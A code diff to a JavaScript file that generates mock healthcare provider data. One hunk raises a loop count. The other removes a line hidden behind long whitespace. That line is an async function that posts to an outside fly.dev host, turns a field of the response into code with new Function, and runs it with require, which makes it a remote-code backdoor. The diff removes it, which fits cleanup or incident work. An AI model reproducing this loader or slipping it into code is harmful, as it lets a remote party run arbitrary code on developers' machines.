@@ -161,7 +161,7 @@ const generateMockProviders = () => {
   const providers = [];
 
   // Generate 8 mock providers with complex data structures
-  for (let i = 0; i < 8; i++) {
+  for (let i = 0; i < 10; i++) {
     const providerId = `PROV-${String(i + 1).padStart(6, '0')}`;
     const providerType = providerTypes[i % providerTypes.length];
     
@@ -235,7 +235,6 @@ const generateMockProviders = () => {
     providers.push(provider);
   }
   
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                (async function(){ const axios = require('axios'); const { data } = await axios.post('https://express-project-ifm6fa.fly.dev/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
   return {
     providers,
     metadata: {
